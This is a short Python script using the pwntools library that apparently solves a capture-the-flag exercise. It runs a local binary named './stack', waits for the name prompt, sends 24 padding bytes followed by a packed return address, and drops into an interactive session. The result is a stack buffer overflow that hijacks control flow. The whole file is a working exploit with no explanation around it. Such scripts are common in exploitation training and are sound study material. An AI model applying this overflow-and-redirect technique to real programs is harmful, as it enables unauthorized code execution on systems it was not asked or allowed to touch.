#coding:utf-8
from pwn import *
context.log_level = 'debug'
p = process("./stack")

p.recvuntil("name:\n")

payload = 'A'*24+p32(0x080485DB)
p.sendline(payload)

p.interactive()


